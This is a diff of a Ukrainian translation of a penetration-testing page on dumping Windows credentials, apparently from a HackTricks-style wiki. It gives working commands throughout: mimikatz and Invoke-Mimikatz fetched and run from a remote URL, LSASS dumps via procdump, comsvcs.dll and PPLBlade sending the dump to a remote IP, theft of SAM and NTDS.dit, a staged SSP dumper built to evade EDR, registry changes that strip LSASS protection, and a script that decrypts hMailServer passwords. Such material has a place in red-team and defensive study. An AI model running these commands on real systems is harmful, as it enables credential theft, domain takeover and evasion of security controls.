@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Дізнайтеся про інші можливості, які Mimikatz може виконувати на** [**this page**](credentials-mimikatz.md)**.**
+**Дізнайтеся про інші можливості Mimikatz на** [**this page**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -24,11 +24,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ці захисти можуть перешкодити Mimikatz витягнути деякі credentials.**
+[**Дізнайтеся про деякі можливі захисти credentials тут.**](credentials-protections.md) **Ці захисти можуть перешкодити Mimikatz у витяганні деяких credentials.**
 
-## Credentials з Meterpreter
+## Credentials with Meterpreter
 
-Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати passwords and hashes** всередині victim.
+Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **search for passwords and hashes** всередині жертви.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -49,10 +49,10 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, Defender його не виявляє.\
-Ви можете використати цей інструмент, щоб **dump the lsass process**, **download the dump** і **extract** **credentials locally** з дампа.
+Оскільки **Procdump з** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
+Ви можете використовувати цей інструмент, щоб **dump the lsass process**, **download the dump** і **extract** **credentials локально** з dump.
 
-Ви також можете використати [SharpDump](https://github.com/GhostPack/SharpDump).
+Також можна використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -69,68 +69,68 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Примітка**: Деякі **AV** можуть **визнати** використання **procdump.exe to dump lsass.exe** за **шкідливе**, це тому, що вони **виявляють** рядок **"procdump.exe" and "lsass.exe"**. Тому більш **приховано** передавати як **аргумент** PID процесу lsass.exe в procdump **замість** імені lsass.exe.
+**Примітка**: Деякі **AV** можуть **позначати** як **шкідливе** використання **procdump.exe to dump lsass.exe**, це відбувається тому, що вони **виявляють** рядок **"procdump.exe" and "lsass.exe"**. Тому більш **непомітно** **передавати** як **аргумент** **PID** lsass.exe до procdump **замість** **імені lsass.exe.**
 
-### Dumping lsass with **comsvcs.dll**
+### Створення дампу lsass за допомогою **comsvcs.dll**
 
-DLL з ім'ям **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі аварії. Ця DLL містить **функцію** з ім'ям **`MiniDumpW`**, призначену для виклику через `rundll32.exe`.\
-Перші два аргументи не мають значення, натомість третій розділяється на три компоненти. Першим є PID процесу, який треба дампнути; другим — місце розташування файлу дампу; третім компонентом має бути строго слово **full**. Інших варіантів немає.\
-Після розбору цих трьох компонентів DLL створює файл дампу та записує в нього пам'ять вказаного процесу.\
-Використання **comsvcs.dll** дозволяє зняти дамп процесу lsass без необхідності завантажувати та виконувати procdump. Цей метод детально описаний на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+DLL з назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі збою. Ця DLL включає **функцію** з назвою **MiniDumpW**, призначену для виклику через `rundll32.exe`.\
+Перші два аргументи несуттєві, але третій розділений на три компоненти. Ідентифікатор процесу, який потрібно зняти, є першою компонентою, місце розташування файлу дампу — другою, а третя компонента має бути строго словом **full**. Інших опцій немає.\
+Після розбору цих трьох компонент DLL створює файл дампу і копіює в нього пам'ять вказаного процесу.\
+Використання **comsvcs.dll** можливе для дампу процесу lsass, що усуває необхідність завантажувати та виконувати procdump. Цей метод детально описаний на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).
 
-The following command is employed for execution:
+Для виконання використовується наступна команда:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
 **Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Отримання дампу lsass за допомогою Task Manager**
+### **Зняття дампу lsass за допомогою Task Manager**
 
-1. Right click on the Task Bar and click on Task Manager
-2. Click on More details
-3. Search for "Local Security Authority Process" process in the Processes tab
-4. Right click on "Local Security Authority Process" process and click on "Create dump file".
+1. Клацніть правою кнопкою миші на Task Bar і виберіть Task Manager
+2. Натисніть More details
+3. Знайдіть процес "Local Security Authority Process" на вкладці Processes
+4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" і виберіть "Create dump file".
 
-### Отримання дампу lsass за допомогою procdump
+### Dumping lsass with procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — підписаний Microsoft бінарний файл, який є частиною пакету [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — цифрово підписаний виконуваний файл Microsoft, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Знімання дампу lsass за допомогою PPLBlade
+## Dumpin lsass with PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це Protected Process Dumper Tool, який підтримує обфускацію memory dump та передачу його на віддалені робочі станції без запису на диск.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це Protected Process Dumper Tool, який підтримує obfuscating memory dump та передачу їх на віддалені workstations без запису на диск.
 
 **Ключові функції**:
 
-1. Обхід захисту PPL
-2. Обфускація memory dump файлів для уникнення механізмів виявлення на основі сигнатур Defender
-3. Завантаження memory dump за допомогою методів RAW та SMB без запису на диск (fileless dump)
+1. Bypassing PPL protection
+2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
+3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
-## LalsDumper – SSP-орієнтований дамп LSASS без MiniDumpWriteDump
+## LalsDumper – дамп LSASS через SSP без виклику MiniDumpWriteDump
 
-Ink Dragon постачає трьохетапний дампер під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки на цей API не спрацьовують:
+Ink Dragon поставляє трьохетапний дампер з назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки на цей API не спрацьовують:
 
-1. **Етап 1 — завантажувач (`lals.exe`)** – шукає в `fdp.dll` заповнювач, що складається з 32 символів `d` у нижньому регістрі, перезаписує його абсолютним шляхом до `rtu.txt`, зберігає патчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливий DLL як новий Security Support Provider (SSP).
-2. **Етап 2 всередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, виконує XOR кожного байта з `0x20` і відображає декодований бінарник у пам'ять перед передачею виконання.
-3. **Етап 3 — дампер** – відображений payload повторно реалізує логіку MiniDump, використовуючи **direct syscalls**, резольвлені з імен API за хешем (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціальний експорт з іменем `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснутий дамп LSASS у файл і закриває дескриптор, щоб ексфільтрація могла відбутися пізніше.
+1. **Stage 1 loader (`lals.exe`)** – шукає в `fdp.dll` плейсхолдер, що складається з 32 малих літер `d`, перезаписує його абсолютним шляхом до `rtu.txt`, зберігає патчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливу DLL як новий Security Support Provider (SSP).
+2. **Stage 2 inside LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, XOR-ить кожен байт з `0x20` і відображає декодований бінарний блок у пам'ять перед передачею виконання.
+3. **Stage 3 dumper** – відображений payload повторно реалізує логіку MiniDump, використовуючи **direct syscalls**, resolved from hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Виділений експорт з іменем `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснутий дамп LSASS у файл і закриває дескриптор, щоб ексфільтрація могла відбутися пізніше.
 
 Примітки оператора:
 
-* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll` та `rtu.txt` в одному каталозі. Етап 1 перезаписує хардкодний заповнювач абсолютним шляхом до `rtu.txt`, тому рознесення файлів порушує ланцюжок.
-* Реєстрація відбувається додаванням `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете встановити це значення самостійно, щоб LSASS підвантажував SSP при кожному завантаженні.
-* `%TEMP%\*.ddt` файли — це стиснуті дампи. Розпакуйте локально, потім подайте їх у Mimikatz/Volatility для витягання облікових даних.
-* Запуск `lals.exe` вимагає прав admin/SeTcb, щоб `AddSecurityPackageA` пройшов успішно; як тільки виклик повернеться, LSASS прозоро завантажує шахрайський SSP і виконує Етап 2.
-* Видалення DLL з диска не вивантажує її з LSASS. Або видаліть запис в реєстрі і перезапустіть LSASS (перезавантаження), або залиште його для довготривалої персистенції.
+* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` в одній директорії. Stage 1 перезаписує жорстко закодований плейсхолдер абсолютним шляхом до `rtu.txt`, тому розділення файлів порушує ланцюжок.
+* Реєстрація відбувається шляхом додавання `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете встановити це значення самостійно, щоб змусити LSASS перезавантажувати SSP при кожному завантаженні.
+* `%TEMP%\*.ddt` файли — це стиснуті дампи. Розпакуйте локально, потім передайте їх у Mimikatz/Volatility для витягання облікових даних.
+* Запуск `lals.exe` вимагає прав admin/SeTcb, щоб виклик `AddSecurityPackageA` пройшов успішно; коли виклик повернеться, LSASS прозоро завантажує скомпрометований SSP і виконує Stage 2.
+* Видалення DLL з диска не вивантажує її з LSASS. Або видаліть запис у реєстрі і перезапустіть LSASS (reboot), або залиште її для довгострокової персистенції.
 
 ## CrackMapExec
 
-### Dump SAM hashes
+### Отримання SAM hashes
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -143,7 +143,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Вивантажити історію паролів NTDS.dit із цільового DC
+### Dump історії паролів NTDS.dit з цільового DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -153,28 +153,28 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.
+Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM_. Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.
 
 ### З реєстру
 
-Найпростіший спосіб вкрасти ці файли — отримати їх копію з реєстру:
+Найпростіший спосіб отримати ці файли — зробити їх копію з реєстру:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Завантажте** ті файли на вашу машину Kali і **витягніть hashes** за допомогою:
+**Завантажте** ті файли на вашу машину Kali та **витягніть hashes** використовуючи:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Ви можете скопіювати захищені файли за допомогою цієї служби. Для цього потрібні права адміністратора.
+Ви можете копіювати захищені файли за допомогою цієї служби. Вам потрібно мати права Адміністратора.
 
 #### Using vssadmin
 
-Бінарний файл vssadmin доступний лише у версіях Windows Server
+Бінарний файл vssadmin доступний лише у версіях Windows Server.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -187,7 +187,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Але ви можете зробити те саме з **Powershell**. Це приклад того, **як скопіювати SAM file** (жорсткий диск, що використовується — "C:" і він збережений у C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
+Але те саме можна зробити і з **Powershell**. Нижче приклад того, **як скопіювати SAM file** (жорсткий диск, що використовується — "C:", і файл збережено в C:\users\Public), але це можна використати для копіювання будь-якого захищеного файлу:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -198,81 +198,83 @@ cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Pu
 cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
 $volume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
+Код з книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+
 ### Invoke-NinjaCopy
 
-Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) щоб зробити копію SAM, SYSTEM та ntds.dit.
+Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб зробити копію SAM, SYSTEM та ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directory Облікові дані - NTDS.dit**
+## **Active Directory Credentials - NTDS.dit**
 
-The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.
+Файл **NTDS.dit** вважається серцем **Active Directory**, що містить критичні дані про об'єкти користувачів, групи та їх членства. Саме тут зберігаються **password hashes** для доменних користувачів. Цей файл — база даних **Extensible Storage Engine (ESE)** і розташований за адресою **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Within this database, three primary tables are maintained:
+У цій базі даних підтримуються три основні таблиці:
 
-- **Data Table**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як users та groups.
-- **Link Table**: Вона відстежує відносини, наприклад group memberships.
-- **SD Table**: **Security descriptors** для кожного об'єкта зберігаються тут, забезпечуючи security та контроль доступу до збережених об'єктів.
+- **Data Table**: ця таблиця відповідає за зберігання відомостей про об'єкти, такі як користувачі та групи.
+- **Link Table**: відстежує зв'язки, наприклад членство в групах.
+- **SD Table**: тут зберігаються **security descriptors** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.
 
 More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).
+Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, і він використовується _lsass.exe_. Тому **частина** файлу **NTDS.dit** може знаходитися **всередині пам'яті `lsass`** (ймовірно, можна знайти останні доступні дані через підвищення продуктивності за рахунок використання **кеша**).
 
-#### Розшифрування хешів всередині NTDS.dit
+#### Розшифровка хешів всередині NTDS.dit
 
-The hash is cyphered 3 times:
+Хеш зашифрований 3 рази:
 
-1. Розшифрувати Password Encryption Key (**PEK**) за допомогою **BOOTKEY** і **RC4**.
-2. Розшифрувати сам **hash** за допомогою **PEK** і **RC4**.
+1. Розшифрувати Password Encryption Key (**PEK**) за допомогою **BOOTKEY** та **RC4**.
+2. Розшифрувати **hash** за допомогою **PEK** та **RC4**.
 3. Розшифрувати **hash** за допомогою **DES**.
 
-**PEK** має **однакове значення** на **кожному domain controller**, але він **зашифрований** всередині файлу **NTDS.dit** з використанням **BOOTKEY** файлу **SYSTEM** доменного контролера (is different between domain controllers). This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** має **те саме значення** на **кожному контролері домену**, але він **зашифрований** всередині файлу **NTDS.dit** з використанням **BOOTKEY** файлу **SYSTEM** контролера домену (відрізняється між контролерами домену). Саме тому, щоб отримати облікові дані з файлу NTDS.dit, **вам потрібні файли NTDS.dit і SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
-### Копіювання NTDS.dit за допомогою Ntdsutil
+### Copying NTDS.dit using Ntdsutil
 
-Available since Windows Server 2008.
+Доступно з Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Ви також можете використати [**volume shadow copy**](#stealing-sam-and-system) трюк, щоб скопіювати файл **ntds.dit**. Пам'ятайте, що вам також потрібна копія **SYSTEM file** (знову ж таки, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) трюк).
+Ви також можете використати прийом [**volume shadow copy**](#stealing-sam-and-system) для копіювання файлу **ntds.dit**. Пам'ятайте, що вам також знадобиться копія **SYSTEM file** (знову ж таки, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) прийом).
 
-### **Витяг хешів з NTDS.dit**
+### **Вилучення hashes з NTDS.dit**
 
-Після того, як ви **отримали** файли **NTDS.dit** і **SYSTEM**, ви можете використовувати інструменти, такі як _secretsdump.py_, щоб **витягти хеші**:
+Після того як ви **отримали** файли **NTDS.dit** та **SYSTEM**, ви можете використати інструменти, такі як _secretsdump.py_, щоб **витягти hashes**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Ви також можете **автоматично їх витягти** за допомогою дійсного domain admin користувача:
+Ви також можете **автоматично витягнути їх**, використовуючи дійсного користувача domain admin:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Для **великих файлів NTDS.dit** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Для **великих NTDS.dit файлів** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Також можна використовувати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`
+Нарешті, ви також можете використати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`
 
-### **Екстракція об'єктів домену з NTDS.dit в базу даних SQLite**
+### **Витягнення об'єктів домену з NTDS.dit до бази даних SQLite**
 
-Об'єкти NTDS можна експортувати в базу даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Експортуються не лише секрети, але й самі об'єкти та їхні атрибути, що дозволяє подальший аналіз інформації після отримання сирого файлу NTDS.dit.
+Об'єкти NTDS можна експортувати до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Експортуються не лише секрети, але й самі об'єкти та їхні атрибути для подальшого вилучення інформації, коли сирий файл NTDS.dit уже отримано.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-The `SYSTEM` hive є необов'язковим, але дозволяє розшифрувати секрети (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Разом з іншою інформацією витягується така інформація : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
+The `SYSTEM` hive є необов'язковим, але дозволяє розшифровувати секрети (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Разом з іншою інформацією витягуються такі дані: облікові записи користувачів і машин з їхніми хешами, UAC flags, мітки часу останнього входу та зміни пароля, опис облікових записів, імена, UPN, SPN, групи та рекурсивне членство, дерево організаційних одиниць і членство, довірені домени з типом довірчих відносин, напрямком та атрибутами...
 
 ## Lazagne
 
-Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей бінарний файл для витягання credentials з різних програм.
+Download the binary from [тут](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей бінарний файл для витягання облікових даних із різного програмного забезпечення.
 ```
 lazagne.exe all
 ```
-## Інші інструменти для витягнення облікових даних із SAM та LSASS
+## Інші інструменти для витягання облікових даних з SAM та LSASS
 
 ### Windows credentials Editor (WCE)
 
-Цей інструмент можна використати для витягнення облікових даних із пам'яті. Завантажити його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Цей інструмент можна використовувати для витягання облікових даних з пам'яті. Завантажити його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Витягає облікові дані з файлу SAM
+Витягує облікові дані з файлу SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
@@ -287,15 +289,15 @@ type outpwdump
 ```
 ### PwDump7
 
-Завантажте його з: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **execute it**, і паролі будуть витягнуті.
+Завантажте його з:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **запустіть його** — паролі будуть витягнуті.
 
-## Виявлення неактивних RDP-сесій і послаблення контролю безпеки
+## Mining idle RDP sessions and weakening security controls
 
-Ink Dragon’s FinalDraft RAT включає tasker `DumpRDPHistory`, техніки якого корисні для будь-якого red-teamer'а:
+Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:
 
-### Збір телеметрії в стилі DumpRDPHistory
+### DumpRDPHistory-style telemetry collection
 
-* **Outbound RDP targets** – розбирайте кожен user hive за шляхом `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підключ зберігає ім'я сервера, `UsernameHint` і timestamp останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:
+* **Outbound RDP targets** – парсіть кожен user hive за адресою `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підключ зберігає назву сервера, `UsernameHint` та час останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:
 
 ```powershell
 Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
@@ -308,7 +310,7 @@ $user = (Get-ItemProperty $_.Name).UsernameHint
 }
 ```
 
-* **Inbound RDP evidence** – опитуйте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на предмет Event IDs **21** (успішний вхід) та **25** (відключення), щоб визначити, хто адміністрував машину:
+* **Inbound RDP evidence** – опитайтеся до журналу `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` за Event IDs **21** (successful logon) та **25** (disconnect), щоб відстежити, хто адміністрував машину:
 
 ```powershell
 Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
@@ -316,24 +318,48 @@ Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Op
 | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
 ```
 
-Коли ви знатимете, який Domain Admin регулярно підключається, дампніть LSASS (за допомогою LalsDumper/Mimikatz), поки їхня **disconnected** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier і токени в LSASS, які потім можна відтворити через SMB/WinRM, щоб витягти `NTDS.dit` або встановити стійкість на domain controllers.
+Коли ви знатимете, який Domain Admin підключається регулярно, дампьте LSASS (через LalsDumper/Mimikatz), поки їхня **відключена** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier та токени в LSASS, які потім можуть бути відтворені через SMB/WinRM, щоб отримати `NTDS.dit` або встановити persistence на domain controllers.
 
 ### Registry downgrades targeted by FinalDraft
-
-Той самий implant також змінює кілька ключів реєстру, щоб полегшити викрадення облікових даних:
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 ```
-* Налаштування `DisableRestrictedAdmin=1` змушує повне повторне використання credential/ticket під час RDP, дозволяючи pass-the-hash style pivots.
-* `LocalAccountTokenFilterPolicy=1` відключає UAC token filtering, тож local admins отримують необмежені tokens через мережу.
-* `DSRMAdminLogonBehavior=2` дозволяє DSRM administrator увійти, поки DC онлайн, даючи атакуючим ще один вбудований обліковий запис з високими привілеями.
-* `RunAsPPL=0` видаляє LSASS PPL protections, роблячи memory access тривіально для dumpers, таких як LalsDumper.
+* Встановлення `DisableRestrictedAdmin=1` змушує повне повторне використання облікових даних/квитків під час RDP, дозволяючи pivots у стилі pass-the-hash.
+* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тож локальні адміністратори отримують необмежені токени по мережі.
+* `DSRMAdminLogonBehavior=2` дозволяє адміністратору DSRM входити, поки DC онлайн, надаючи нападнику ще один вбудований обліковий запис з високими привілеями.
+* `RunAsPPL=0` знімає захист LSASS PPL, роблячи доступ до пам'яті тривіальним для дамперів, таких як LalsDumper.
 
-## Джерела
+## hMailServer database credentials (post-compromise)
 
+hMailServer зберігає пароль БД у `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` під `[Database] Password=`. Значення зашифроване Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і має перестановку порядку байтів для 4-байтових слів. Використайте hex string з INI з цим Python-скриптом:
+```python
+from Crypto.Cipher import Blowfish
+import binascii
+
+def swap4(data):
+return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
+enc_hex = "HEX_FROM_HMAILSERVER_INI"
+enc = binascii.unhexlify(enc_hex)
+key = b"THIS_KEY_IS_NOT_SECRET"
+plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
+print(plain.decode())
+```
+Маючи clear-text password, скопіюйте базу даних SQL CE, щоб уникнути блокувань файлів; завантажте 32-bit provider і, при потребі, виконайте upgrade перед запитом hashes:
+```powershell
+Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
+Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
+$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
+$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
+$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
+$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
+```
+Стовпець `accountpassword` використовує hMailServer hash format (hashcat mode `1421`). Cracking цих значень може надати reusable credentials для WinRM/SSH pivots.
+## Посилання
+
+- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
